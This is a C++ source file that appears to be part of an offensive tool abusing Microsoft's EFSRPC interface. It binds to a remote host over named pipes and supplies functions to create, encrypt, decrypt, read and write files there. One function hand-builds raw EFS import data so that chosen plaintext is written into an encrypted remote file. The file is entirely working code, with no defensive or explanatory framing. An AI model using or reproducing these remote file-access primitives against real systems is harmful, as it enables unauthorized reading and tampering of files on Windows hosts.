#include "efsrpc_wrapper.hpp"
#include "efsrpc_h.h"
#include "encrypted_object_manipulation.hpp"

#include <windows.h>
#include <iostream>

namespace
{
    void __RPC_USER PipeAlloc(char*, unsigned long p_requested, unsigned char** p_allocated, unsigned long* p_actual)
    {
        *p_actual = p_requested;
        *p_allocated = new unsigned char[p_requested];
    }

    // server -> client
    void __RPC_USER PipeBufferPush(char* p_state, unsigned char* p_server_buf, unsigned long p_size)
    {
        if (p_size > 0)
        {
            std::vector<char>& for_client = *reinterpret_cast<std::vector<char>*>(p_state);
            for_client.insert(for_client.end(), p_server_buf, p_server_buf + p_size);
        }
    }

    // https://docs.microsoft.com/en-us/windows/win32/rpc/implementing-input-pipes-on-the-client
    // client -> server
    void __RPC_USER PipeBufferPull(char* p_state, unsigned char* p_server_buf, unsigned long p_max_size, unsigned long* p_copied)
    {
        std::vector<char>& client_buf = *reinterpret_cast<std::vector<char>*>(p_state);
        if (client_buf.empty())
        {
            // no more data to send
            *p_copied = 0;
            return;
        }

        std::size_t copy_size = p_max_size;
        if (copy_size > client_buf.size())
        {
            copy_size = client_buf.size();
        }
        *p_copied = copy_size;

        memcpy(p_server_buf, &client_buf[0], copy_size);
        client_buf.erase(client_buf.begin(), client_buf.begin() + copy_size);
    }
}

void* __RPC_USER MIDL_user_allocate(size_t size)
{
    return new char[size];
}

void __RPC_USER MIDL_user_free(void* p)
{
    delete[] p;
}

// https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcstringbindingcomposea
// https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingfromstringbinding
// https://docs.microsoft.com/en-us/windows/win32/api/rpcdce/nf-rpcdce-rpcbindingsetauthinfow
RPC_BINDING_HANDLE create_binding_handle(const std::string& p_rhost)
{
    RPC_CSTR bind_string = NULL;
    std::string proto_seq("ncacn_np");
    std::string options("");
    RPC_BINDING_HANDLE bind_handle = INVALID_HANDLE_VALUE;
    RPC_STATUS status = RpcStringBindingComposeA(NULL, reinterpret_cast<RPC_CSTR>(proto_seq.data()),
        reinterpret_cast<RPC_CSTR>(const_cast<char*>(p_rhost.data())), NULL,
        reinterpret_cast<RPC_CSTR>(const_cast<char*>(options.data())), &bind_string);

    if (status != RPC_S_OK)
    {
        std::cerr << "[-] RpcStringBindingComposeA failed with status: " << status << std::endl;
        return bind_handle;
    }

    status = RpcBindingFromStringBindingA(bind_string, &bind_handle);
    if (status != RPC_S_OK)
    {
        std::cerr << "[-] RpcBindingFromStringBindingA failed with status: " << status << std::endl;
        return bind_handle;
    }

    // https://docs.microsoft.com/en-us/windows/win32/api/dsparse/nf-dsparse-dsmakespna
    // dsmakespn would would just create this string so let's cut it out
    std::string servicepn("HOST/");
    servicepn.append(p_rhost);
    status = RpcBindingSetAuthInfoA(bind_handle, reinterpret_cast<RPC_CSTR>(servicepn.data()),
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_GSS_NEGOTIATE, NULL, RPC_C_AUTHN_GSS_NEGOTIATE);

    if (status != RPC_S_OK)
    {
        std::cerr << "[-] RpcBindingSetAuthInfoA failed with status: " << status << std::endl;
        return INVALID_HANDLE_VALUE;
    }

    RpcStringFreeA(&bind_string);
    return bind_handle;
}

bool create_remote_file(RPC_BINDING_HANDLE p_bind_handle, const std::string& p_rfile)
{
    PEXIMPORT_CONTEXT_HANDLE ctx = NULL;
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (long error = EfsRpcOpenFileRaw(p_bind_handle, &ctx, path.c_str(), CREATE_FOR_IMPORT))
    {
        std::cerr << "[-] EfsRpcOpenFileRaw failed with status code: " << error << std::endl;
        return false;
    }

    EfsRpcCloseRaw(&ctx);
	return true;
}

bool create_remote_directory(RPC_BINDING_HANDLE p_bind_handle, const std::string& p_rfile)
{
    PEXIMPORT_CONTEXT_HANDLE ctx = NULL;
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (long error = EfsRpcOpenFileRaw(p_bind_handle, &ctx, path.c_str(), CREATE_FOR_DIR | CREATE_FOR_IMPORT))
    {
        std::cerr << "[-] EfsRpcOpenFileRaw failed with status code: " << error << std::endl;
        return false;
    }

    EfsRpcCloseRaw(&ctx);
    return true;
}

bool encrypt_remote_file(RPC_BINDING_HANDLE p_bind_handle, const std::string& p_rfile)
{
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (long error = EfsRpcEncryptFileSrv(p_bind_handle, path.c_str()))
    {
        std::cerr << "[-] EfsRpcEncryptFileSrv failed with status code: " << error << std::endl;
        return false;
    }
    return true;
}

bool decrypt_remote_file(RPC_BINDING_HANDLE p_bind_handle, const std::string& p_rfile)
{
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (long error = EfsRpcDecryptFileSrv(p_bind_handle, path.c_str(), 0))
    {
        std::cerr << "[-] EfsRpcDecryptFileSrv failed with status code: " << error << std::endl;
        return false;
    }
    return true;
}

bool decrypt_remote_file(RPC_BINDING_HANDLE p_bind_handle, const std::string& p_rfile, long& p_status)
{
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (p_status = EfsRpcDecryptFileSrv(p_bind_handle, path.c_str(), 0))
    {
        std::cerr << "[-] EfsRpcDecryptFileSrv failed with status code: " << p_status << std::endl;
        return false;
    }
    return true;
}

std::vector<char> read_remote_file(RPC_BINDING_HANDLE p_bind_handle, const std::string& p_rfile)
{
    std::vector<char> remote_file_data;
    PEXIMPORT_CONTEXT_HANDLE ctx = NULL;
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (long error = EfsRpcOpenFileRaw(p_bind_handle, &ctx, path.c_str(), 0))
    {
        std::cerr << "[-] EfsRpcOpenFileRaw failed with status code: " << error << std::endl;
        return remote_file_data;
    }
    
    EFS_EXIM_PIPE pipe = {};
    pipe.alloc = PipeAlloc;
    pipe.push = PipeBufferPush;
    pipe.pull = PipeBufferPull;
    pipe.state = reinterpret_cast<char*>(&remote_file_data);

    if (long error = EfsRpcReadFileRaw(ctx, &pipe))
    {
        std::cerr << "[-] EfsRpcReadFileRaw failed with status code: " << error << std::endl;
    }

    EfsRpcCloseRaw(&ctx);
    return remote_file_data;
}

bool write_plaintext_to_encrypted_efs(RPC_BINDING_HANDLE p_bind_handle, const std::vector<char>& p_remote_data, const std::string& p_rfile, const std::string& p_file_data)
{
    std::vector<char> out_data;
    std::size_t ofs = 0;
    AppendBuffer(out_data, ReadBuffer(p_remote_data, ofs, 20));

    // Copy the EFS metadata header.
    CopyChunk(out_data, p_remote_data, ofs);
    CopyChunk(out_data, p_remote_data, ofs);
    WriteStreamHeader(out_data, L"::$DATA");
    WriteGUREHeader(out_data, p_file_data);

    EFS_EXIM_PIPE pipe = {};
    pipe.alloc = PipeAlloc;
    pipe.push = PipeBufferPush;
    pipe.pull = PipeBufferPull;
    pipe.state = reinterpret_cast<char*>(&out_data);

    PEXIMPORT_CONTEXT_HANDLE ctx = NULL;
    std::wstring path(p_rfile.begin(), p_rfile.end());
    if (long error = EfsRpcOpenFileRaw(p_bind_handle, &ctx, path.c_str(), CREATE_FOR_IMPORT))
    {
        std::cerr << "[-] EfsRpcOpenFileRaw failed with status code: " << error << std::endl;
        return false;
    }

    if (long error = EfsRpcWriteFileRaw(ctx, &pipe))
    {
        EfsRpcCloseRaw(&ctx);
        std::cerr << "[-] EfsRpcWriteFileRaw failed with status code: " << error << std::endl;
        return false;
    }

    EfsRpcCloseRaw(&ctx);
    return true;
}
